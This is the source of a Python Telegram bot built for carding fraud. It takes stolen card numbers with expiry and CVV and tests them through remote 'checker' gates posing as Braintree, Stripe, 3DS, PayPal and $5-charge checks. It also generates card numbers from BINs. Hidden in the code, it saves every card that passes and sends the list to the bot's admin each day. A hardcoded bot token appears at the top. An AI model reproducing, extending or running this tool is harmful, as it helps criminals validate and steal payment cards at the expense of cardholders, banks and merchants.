import telebot
from telebot import types
import requests
import time
from datetime import datetime
import re
import urllib.parse
import logging
import json
import os
import threading
from queue import Queue

# Initialize bot
bot = telebot.TeleBot("7341521287:AAH-455ZQDUasACW3YkV0xvmPtTy-kgn0yU")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# User data and rate limiting
user_data = {}
banned_users = set()
processing_users = set()  # Track users currently processing cards
approved_cards = []  # Store approved cards for daily report
FLOOD_WAIT = 15  # seconds between commands
MAX_CHECKS_PER_HOUR = 50
MAX_FLOOD_ATTEMPTS = 4
API_TIMEOUT = 120  # 2 minutes timeout for API requests
VERIFICATION_CHAT_ID = -1002511254143  # Your group chat ID
ADMIN_ID = 7535818274  # Your admin ID

# Task queue for card checking
task_queue = Queue()

# Load banned users from file if exists
if os.path.exists('banned_users.json'):
    with open('banned_users.json', 'r') as f:
        banned_users = set(json.load(f))

# Load approved cards from file if exists
if os.path.exists('approved_cards.json'):
    with open('approved_cards.json', 'r') as f:
        approved_cards = json.load(f)

# Gateway URLs
GATEWAY_URLS = {
    'chk': 'http://147.93.105.138:2222/gate=braintree/key=waslost/cc=',
    'st': 'http://147.93.105.138:5000/key=dark/cc=',
    'vbv': 'http://147.93.105.138:7777/key=darkvbv/cc=',
    'pp': 'http://194.164.150.141:5555/key=never/cc=',
    'au': 'http://147.93.105.138:6655/gate=5/key=waslost/cc='
}

# Gateway names
GATEWAY_NAMES = {
    'chk': 'Braintree Auth',
    'st': 'Stripe Auth',
    'vbv': '3DS Lookup',
    'pp': 'Paypal Charged',
    'au': 'Auth Charge $5'
}

# Worker function to process card checks
def worker():
    while True:
        task = task_queue.get()
        if task is None:
            break
        try:
            check_card(*task)
        except Exception as e:
            logger.error(f"Error processing task: {e}")
        finally:
            task_queue.task_done()

# Start worker threads
NUM_WORKERS = 5  # Number of concurrent card checks
worker_threads = []
for i in range(NUM_WORKERS):
    t = threading.Thread(target=worker)
    t.start()
    worker_threads.append(t)

# Function to send daily approved cards report
def send_daily_report():
    while True:
        try:
            now = datetime.now()
            # Send report at 00:00 UTC
            if now.hour == 0 and now.minute == 0:
                if approved_cards:
                    # Create report file
                    report_filename = f"approved_cards_{now.strftime('%Y-%m-%d')}.txt"
                    with open(report_filename, 'w') as f:
                        f.write("\n".join(approved_cards))
                    
                    # Send to admin
                    with open(report_filename, 'rb') as f:
                        bot.send_document(
                            ADMIN_ID,
                            f,
                            caption=f"📊 Daily Approved Cards Report - {now.strftime('%Y-%m-%d')}\n"
                                   f"Total Approved Cards: {len(approved_cards)}"
                        )
                    
                    # Clear approved cards for new day
                    approved_cards.clear()
                    with open('approved_cards.json', 'w') as f:
                        json.dump(approved_cards, f)
                    
                    logger.info("Sent daily approved cards report to admin")
                else:
                    bot.send_message(
                        ADMIN_ID,
                        "📊 Daily Approved Cards Report - No approved cards today"
                    )
                
                # Sleep for 1 hour to avoid multiple sends
                time.sleep(3600)
            else:
                # Sleep for 1 minute
                time.sleep(60)
        except Exception as e:
            logger.error(f"Error in daily report: {e}")
            time.sleep(60)

# Start daily report thread
report_thread = threading.Thread(target=send_daily_report)
report_thread.daemon = True
report_thread.start()

# Function to check if user is in verification group
def is_user_verified(user_id):
    try:
        chat_member = bot.get_chat_member(VERIFICATION_CHAT_ID, user_id)
        return chat_member.status not in ['left', 'kicked']
    except Exception as e:
        logger.error(f"Error checking group membership: {e}")
        return False

# Function to show verification request
def show_verification_request(chat_id):
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("Join Group", url="https://t.me/+pc3VETyMzqZjODFl")
    verify_button = types.InlineKeyboardButton("Verify", callback_data="verify")
    markup.add(join_button, verify_button)
    
    bot.send_message(
        chat_id,
        "⚠️ You must join our group to use this bot.\n\n"
        "1. Click 'Join Group' button to join\n"
        "2. After joining, click 'Verify' button",
        reply_markup=markup
    )

# Handle /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # Check if user is banned
    if user_id in banned_users:
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return
    
    logger.info(f"Start command from {user_id}")
    
    # Check if user is verified
    if not is_user_verified(user_id):
        show_verification_request(message.chat.id)
        return
    
    # User is verified, show menu
    markup = types.InlineKeyboardMarkup()
    menu_button = types.InlineKeyboardButton("Menu", callback_data="menu")
    markup.add(menu_button)
    
    welcome_text = """🤖 Bot Status: Active ✅

📢 For announcements and updates, join us 👉 [here](https://t.me/raven336updates/)

💡 Tip: To use Alpha in your group, make sure to set it as an admin."""
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'verify')
def handle_verify(call):
    user_id = call.from_user.id
    try:
        if is_user_verified(user_id):
            bot.answer_callback_query(call.id, "Verification successful! You can now use the bot.")
            send_welcome(call.message)
        else:
            bot.answer_callback_query(call.id, "You haven't joined the group yet. Please join first.")
    except Exception as e:
        logger.error(f"Verification error: {e}")
        bot.answer_callback_query(call.id, "Verification failed. Please try again.")

# Handle callback queries
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    
    # Check if user is banned
    if user_id in banned_users:
        bot.answer_callback_query(call.id, "You are banned from using this bot.")
        return
    
    # Check if user is verified
    if not is_user_verified(user_id):
        show_verification_request(call.message.chat.id)
        bot.answer_callback_query(call.id, "You need to join our group first.")
        return
    
    chat_id = call.message.chat.id
    logger.info(f"Callback from {user_id}: {call.data}")
    
    if call.data == "menu":
        show_menu(call.message)
    elif call.data == "auth":
        show_auth_menu(call.message)
    elif call.data == "charged":
        show_charged(call.message)
    elif call.data == "back":
        show_menu(call.message)
    elif call.data == "braintree":
        show_braintree(call.message)
    elif call.data == "stripe":
        show_stripe(call.message)
    elif call.data == "vbv3ds":
        show_vbv3ds(call.message)
    elif call.data == "paypal":
        show_paypal(call.message)
    elif call.data == "back_auth":
        show_auth_menu(call.message)

def show_menu(message):
    text = """🔐 All Gates are made with love and hard work :) by @Darkboy336

Usage Format: [command] CARD_NUMBER|MM|YYYY|CVV or CC|MM|YY|CVV"""
    
    markup = types.InlineKeyboardMarkup()
    auth_button = types.InlineKeyboardButton("Auth", callback_data="auth")
    charged_button = types.InlineKeyboardButton("Charged", callback_data="charged")
    markup.row(auth_button, charged_button)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, 
                         text=text, reply_markup=markup)

def show_auth_menu(message):
    markup = types.InlineKeyboardMarkup()
    braintree = types.InlineKeyboardButton("Braintree", callback_data="braintree")
    stripe = types.InlineKeyboardButton("Stripe", callback_data="stripe")
    vbv3ds = types.InlineKeyboardButton("VBV 3DS", callback_data="vbv3ds")
    paypal = types.InlineKeyboardButton("Paypal", callback_data="paypal")
    back = types.InlineKeyboardButton("Back", callback_data="back")
    
    markup.row(braintree, stripe)
    markup.row(vbv3ds, paypal)
    markup.row(back)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, 
                         text="Select Auth Gateway:", reply_markup=markup)

def show_charged(message):
    markup = types.InlineKeyboardMarkup()
    back_button = types.InlineKeyboardButton("Back", callback_data="back")
    markup.add(back_button)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, 
                         text="Adding soon stay Tuned", reply_markup=markup)

def show_braintree(message):
    current_date = datetime.now().strftime("%d/%m/%y")
    text = f"""Braintree Gate    

Braintree Auth
/chk ✅ Active | {current_date}

Adding More Soon"""
    
    markup = types.InlineKeyboardMarkup()
    back_button = types.InlineKeyboardButton("Back", callback_data="back_auth")
    markup.add(back_button)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, 
                         text=text, reply_markup=markup)

def show_stripe(message):
    current_date = datetime.now().strftime("%d/%m/%y")
    text = f"""Stripe Gate    

Stripe Auth
/st ✅ Active | {current_date}

Adding More Soon"""
    
    markup = types.InlineKeyboardMarkup()
    back_button = types.InlineKeyboardButton("Back", callback_data="back_auth")
    markup.add(back_button)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, 
                         text=text, reply_markup=markup)

def show_vbv3ds(message):
    current_date = datetime.now().strftime("%d/%m/%y")
    text = f"""3DS Gate    

3DS Lookup
/vbv ✅ Active | {current_date}

Adding More Soon"""
    
    markup = types.InlineKeyboardMarkup()
    back_button = types.InlineKeyboardButton("Back", callback_data="back_auth")
    markup.add(back_button)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, 
                         text=text, reply_markup=markup)

def show_paypal(message):
    current_date = datetime.now().strftime("%d/%m/%y")
    text = f"""Paypal Gate    

Paypal Gate
/pp ✅ Active | {current_date}

Adding More Soon"""
    
    markup = types.InlineKeyboardMarkup()
    back_button = types.InlineKeyboardButton("Back", callback_data="back_auth")
    markup.add(back_button)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, 
                         text=text, reply_markup=markup)

# Handle card checking commands
@bot.message_handler(commands=['chk', 'st', 'vbv', 'pp', 'au'])
def handle_slash_commands(message):
    user_id = message.from_user.id
    if user_id in banned_users:
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return
    
    # Check if user is verified
    if not is_user_verified(user_id):
        show_verification_request(message.chat.id)
        return
    
    logger.info(f"Command from {user_id}: {message.text}")
    process_card_check(message)

@bot.message_handler(regexp=r'^\.(chk|st|vbv|pp|au)\b')
def handle_dot_commands(message):
    user_id = message.from_user.id
    if user_id in banned_users:
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return
    
    # Check if user is verified
    if not is_user_verified(user_id):
        show_verification_request(message.chat.id)
        return
    
    logger.info(f"Dot command from {user_id}: {message.text}")
    process_card_check(message)

def process_card_check(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if user is already processing a card
    if user_id in processing_users:
        bot.reply_to(message, "⏳ Please wait, your previous card is still being processed.")
        return
    
    # Check rate limits and flood attempts
    rate_check = check_rate_limit(user_id, chat_id)
    if not rate_check or rate_check == 'banned':
        if rate_check == 'banned':
            bot.reply_to(message, "🚫 You have been banned for flooding commands.")
        return
    
    # Extract command and card details
    command = message.text.split()[0].lower()
    if command.startswith('.'):
        command = '/' + command[1:]  # Convert .command to /command
    
    if len(message.text.split()) < 2:
        # Check if replying to a message with card details
        if message.reply_to_message:
            card_text = message.reply_to_message.text
            card_details = extract_card_details(card_text)
            if card_details:
                # Add task to queue
                processing_users.add(user_id)
                task_queue.put((message, command, card_details))
                return
        
        bot.reply_to(message, "Please provide card details in format: CC|MM|YY|CVV or CC|MM|YYYY|CVV")
        return
    
    card_details = message.text.split(maxsplit=1)[1]
    # Add task to queue
    processing_users.add(user_id)
    task_queue.put((message, command, card_details))

def check_card(message, command, card_details):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    try:
        # Validate card format and convert 2-digit year to 4-digit
        validated_card = validate_and_fix_card_format(card_details)
        if not validated_card:
            bot.reply_to(message, "Invalid card format. Use: CC|MM|YYYY|CVV or CC|MM|YY|CVV")
            return
        
        # Send "checking" message
        processing_msg = bot.reply_to(message, "Checking Card. Please Wait...")
        
        # Get gateway URL
        gateway_key = command.lstrip('/')
        base_url = GATEWAY_URLS.get(gateway_key, '')
        if not base_url:
            bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id,
                                text="Error: Invalid gateway")
            return
        
        # URL encode the card details
        encoded_card = urllib.parse.quote(validated_card)
        url = base_url + encoded_card
        
        logger.info(f"Checking card via {url}")
        
        start_time = time.time()
        response = requests.get(url, timeout=API_TIMEOUT)
        elapsed_time = time.time() - start_time
        
        logger.info(f"API response for {url}: {response.status_code} in {elapsed_time:.2f}s")
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                # Get BIN info
                bin_info = get_bin_info(validated_card.split('|')[0][:6])
                
                # Format response based on gateway
                if gateway_key == 'chk':
                    response_text = format_chk_response(data, validated_card, command, elapsed_time, bin_info)
                elif gateway_key == 'st':
                    response_text = format_st_response(data, validated_card, command, elapsed_time, bin_info)
                elif gateway_key == 'vbv':
                    response_text = format_vbv_response(data, validated_card, command, elapsed_time, bin_info)
                elif gateway_key == 'au':
                    response_text = format_au_response(data, validated_card, command, elapsed_time, bin_info)
                else:
                    response_text = format_default_response(data, validated_card, command, elapsed_time, bin_info)
                
                # Check if card was approved and add to approved list
                if any(word in response_text.lower() for word in ['approved', 'charged', 'success']):
                    approved_cards.append(validated_card)
                    # Save approved cards to file
                    with open('approved_cards.json', 'w') as f:
                        json.dump(approved_cards, f)
                
                # Edit the processing message with final result
                bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id,
                                    text=response_text, parse_mode='HTML')
            except ValueError as e:
                logger.error(f"JSON decode error: {e}")
                bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id,
                                    text="Failed to decode API response. Please try again later.")
        else:
            logger.error(f"API returned {response.status_code}")
            bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id,
                                text="Failed to connect to our servers. Please try again later.")
    except requests.exceptions.Timeout:
        logger.error("API request timed out")
        bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id,
                            text="Request timed out. Please try again later.")
    except requests.exceptions.RequestException as e:
        logger.error(f"Request exception: {e}")
        bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id,
                            text="Failed to connect to our servers. Please try again later.")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id,
                            text="An unexpected error occurred. Please try again later.")
    finally:
        # Remove user from processing set
        processing_users.discard(user_id)

def validate_and_fix_card_format(card_details):
    parts = card_details.split('|')
    if len(parts) != 4:
        return None
    
    cc, mm, yyyy, cvv = parts
    
    # Validate CC number (15-16 digits)
    if not cc.isdigit() or len(cc) < 15 or len(cc) > 16:
        return None
    
    # Validate month (2 digits, 01-12)
    if not mm.isdigit() or len(mm) != 2 or int(mm) < 1 or int(mm) > 12:
        return None
    
    # Validate year (2 or 4 digits) and convert to 4 digits if needed
    if not yyyy.isdigit():
        return None
    
    if len(yyyy) == 2:
        current_year_short = datetime.now().year % 100
        input_year = int(yyyy)
        # If input year is <= current year + 10, assume 2000s, else 1900s
        if input_year <= current_year_short + 10:
            yyyy = f"20{yyyy}"
        else:
            yyyy = f"19{yyyy}"
    elif len(yyyy) != 4:
        return None
    
    # Validate CVV (3-4 digits)
    if not cvv.isdigit() or len(cvv) not in [3, 4]:
        return None
    
    return f"{cc}|{mm}|{yyyy}|{cvv}"

def format_chk_response(data, card_details, command, elapsed_time, bin_info):
    status = data.get('status', 'Unknown').replace('✅', '✅').replace('Approved', '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅')
    response = data.get('response', 'No response')
    
    gateway_name = GATEWAY_NAMES.get(command.lstrip('/'), 'Unknown Gateway')
    
    card_type = bin_info.get('type', 'Unknown')
    brand = bin_info.get('brand', 'Unknown')
    issuer = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    flag = bin_info.get('country_flag', '')
    
    return f"""<b>{status}</b>

𝗖𝗮𝗿𝗱: <code>{card_details}</code>
<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {gateway_name}
<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response}

<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}
<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {issuer}
<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {flag}

<b>𝗧𝗶𝗺𝗲:</b> {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

def format_st_response(data, card_details, command, elapsed_time, bin_info):
    status = data.get('status', 'Unknown')
    if status.lower() == 'approved':
        status = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
    elif status.lower() == 'declined':
        status = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
    response = data.get('response', 'No response')
    
    gateway_name = GATEWAY_NAMES.get(command.lstrip('/'), 'Unknown Gateway')
    
    card_type = bin_info.get('type', 'Unknown')
    brand = bin_info.get('brand', 'Unknown')
    issuer = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    flag = bin_info.get('country_flag', '')
    
    return f"""<b>{status}</b>

𝗖𝗮𝗿𝗱: <code>{card_details}</code>
<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {gateway_name}
<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response}

<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}
<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {issuer}
<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {flag}

<b>𝗧𝗶𝗺𝗲:</b> {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

def format_vbv_response(data, card_details, command, elapsed_time, bin_info):
    status = data.get('status', 'Unknown')
    if status.lower() == 'approved':
        status = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
    elif status.lower() == 'declined':
        status = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
    response = data.get('response', 'No response')
    
    gateway_name = GATEWAY_NAMES.get(command.lstrip('/'), 'Unknown Gateway')
    
    # Get bin_info from API response if available
    api_bin_info = data.get('bin_info', {})
    card_type = api_bin_info.get('type', bin_info.get('type', 'Unknown'))
    brand = api_bin_info.get('brand', bin_info.get('brand', 'Unknown'))
    issuer = api_bin_info.get('bank', bin_info.get('bank', 'Unknown'))
    country = api_bin_info.get('country', bin_info.get('country_name', 'Unknown'))
    flag = '🇹🇷' if 'TURKEY' in country.upper() else bin_info.get('country_flag', '')
    
    return f"""<b>{status}</b>

𝗖𝗮𝗿𝗱: <code>{card_details}</code>
<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {gateway_name}
<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response}

<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}
<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {issuer}
<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {flag}

<b>𝗧𝗶𝗺𝗲:</b> {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

def format_au_response(data, card_details, command, elapsed_time, bin_info):
    status = data.get('status', 'Unknown')
    if status.lower() == 'charged':
        status = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
    else:
        status = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
    response = data.get('response', 'No response')
    
    gateway_name = GATEWAY_NAMES.get(command.lstrip('/'), 'Unknown Gateway')
    
    card_type = bin_info.get('type', 'Unknown')
    brand = bin_info.get('brand', 'Unknown')
    issuer = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    flag = bin_info.get('country_flag', '')
    
    return f"""<b>{status}</b>

𝗖𝗮𝗿𝗱: <code>{card_details}</code>
<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {gateway_name}
<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response}

<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}
<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {issuer}
<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {flag}

<b>𝗧𝗶𝗺𝗲:</b> {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

def format_default_response(data, card_details, command, elapsed_time, bin_info):
    status = data.get('status', 'Unknown')
    if status.lower() == 'approved':
        status = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
    elif status.lower() == 'declined':
        status = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
    response = data.get('response', 'No response')
    
    gateway_name = GATEWAY_NAMES.get(command.lstrip('/'), 'Unknown Gateway')
    
    card_type = bin_info.get('type', 'Unknown')
    brand = bin_info.get('brand', 'Unknown')
    issuer = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    flag = bin_info.get('country_flag', '')
    
    return f"""<b>{status}</b>

𝗖𝗮𝗿𝗱: <code>{card_details}</code>
<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {gateway_name}
<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response}

<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}
<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {issuer}
<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {flag}

<b>𝗧𝗶𝗺𝗲:</b> {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

# Handle card generation
@bot.message_handler(commands=['gen'])
def handle_slash_gen(message):
    user_id = message.from_user.id
    if user_id in banned_users:
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return
    
    # Check if user is verified
    if not is_user_verified(user_id):
        show_verification_request(message.chat.id)
        return
    
    logger.info(f"Gen command from {user_id}")
    process_gen_command(message)

@bot.message_handler(regexp=r'^\.gen\b')
def handle_dot_gen(message):
    user_id = message.from_user.id
    if user_id in banned_users:
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return
    
    # Check if user is verified
    if not is_user_verified(user_id):
        show_verification_request(message.chat.id)
        return
    
    logger.info(f"Dot gen command from {user_id}")
    process_gen_command(message)

def process_gen_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Please provide a BIN (e.g., /gen 411111)")
        return
    
    bin_number = message.text.split()[1]
    
    # Send processing message
    processing_msg = bot.reply_to(message, "Generating cards... Please wait")
    
    try:
        url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_number}&count=10"
        logger.info(f"Generating cards from {url}")
        
        response = requests.get(url, timeout=API_TIMEOUT)
        
        if response.status_code == 200:
            # Handle text response (one card per line)
            cards = response.text.split('\n')
            cards = [card.strip() for card in cards if card.strip()]
            
            if not cards:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=processing_msg.message_id,
                    text="No cards generated. Please try a different BIN."
                )
                return
            
            # Get BIN info
            bin_info = get_bin_info(bin_number[:6])
            
            # Format response with <code> tags for each card
            card_list = "\n".join([f"<code>{card}</code>" for card in cards])
            
            card_type = bin_info.get('type', 'Unknown')
            brand = bin_info.get('brand', 'Unknown')
            issuer = bin_info.get('bank', 'None')  # Show 'None' instead of 'Unknown'
            country = bin_info.get('country_name', 'Unknown')
            flag = bin_info.get('country_flag', '')
            
            response_text = f"""𝗕𝗜𝗡 ⇾ {bin_number}
𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ {len(cards)}

{card_list}

𝗜𝗻𝗳𝗼: {brand} - {card_type}
𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}"""
            
            # Edit the processing message with final result
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=processing_msg.message_id,
                text=response_text,
                parse_mode='HTML'
            )
        else:
            logger.error(f"Generator returned {response.status_code}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=processing_msg.message_id,
                text="Failed to generate cards. API returned error status."
            )
    except requests.exceptions.Timeout:
        logger.error("Generator request timed out")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text="Request timed out. Please try again later."
        )
    except Exception as e:
        logger.error(f"Generator error: {e}")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text="Failed to generate cards. Please try again later."
        )

# Admin stats command
@bot.message_handler(commands=['stats'])
def handle_stats(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "🚫 This command is only for admins.")
        return
    
    # Count active users (users who have used commands)
    active_users = len(user_data)
    
    # Count banned users
    banned_count = len(banned_users)
    
    # Count current processing tasks
    processing_count = len(processing_users)
    
    # Get queue size
    queue_size = task_queue.qsize()
    
    # Count approved cards
    approved_count = len(approved_cards)
    
    stats_msg = f"""📊 Bot Statistics:
    
🟢 Active Users: {active_users}
🔴 Banned Users: {banned_count}
🔄 Currently Processing: {processing_count}
📥 Tasks in Queue: {queue_size}
✅ Approved Cards Today: {approved_count}"""
    
    bot.reply_to(message, stats_msg)

# Helper functions
def check_rate_limit(user_id, chat_id):
    now = time.time()
    
    # Initialize user data if not exists
    if user_id not in user_data:
        user_data[user_id] = {
            'last_command': 0,
            'command_count': 0,
            'reset_time': now + 3600,  # 1 hour from now
            'flood_attempts': 0,
            'last_warning': 0
        }
    
    user = user_data[user_id]
    
    # Reset count if hour has passed
    if now > user['reset_time']:
        user['command_count'] = 0
        user['reset_time'] = now + 3600
        user['flood_attempts'] = 0
    
    # Check flood wait
    time_since_last = now - user['last_command']
    if time_since_last < FLOOD_WAIT:
        user['flood_attempts'] += 1
        
        # Ban user if they exceed flood attempts
        if user['flood_attempts'] >= MAX_FLOOD_ATTEMPTS:
            banned_users.add(user_id)
            # Save banned users to file
            with open('banned_users.json', 'w') as f:
                json.dump(list(banned_users), f)
            return 'banned'
        
        # Only warn once per 15 seconds
        if now - user['last_warning'] > FLOOD_WAIT:
            remaining = FLOOD_WAIT - int(time_since_last)
            bot.send_message(chat_id, f"⚠️ Please wait {remaining} seconds before using another command. Flooding will result in a ban.")
            user['last_warning'] = now
        return False
    
    # Check max checks per hour
    if user['command_count'] >= MAX_CHECKS_PER_HOUR:
        remaining = int((user['reset_time'] - now) / 60)
        bot.send_message(chat_id, f"⚠️ You have checked all {MAX_CHECKS_PER_HOUR} cards in 1 hour. Come back in {remaining} minutes.")
        return False
    
    # Update user data
    user['last_command'] = now
    user['command_count'] += 1
    user['flood_attempts'] = 0  # Reset flood attempts if command is properly spaced
    
    return True

def extract_card_details(text):
    # More robust extraction of card details from text
    pattern = r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}'
    match = re.search(pattern, text)
    return match.group(0) if match else None

def get_bin_info(bin_number):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        logger.error(f"BIN lookup error: {e}")
    return {}

# Cleanup function
def cleanup():
    logger.info("Shutting down worker threads...")
    for _ in range(NUM_WORKERS):
        task_queue.put(None)
    for t in worker_threads:
        t.join()

# Start the bot
logger.info("Bot is starting...")
try:
    bot.infinity_polling()
finally:
    cleanup()
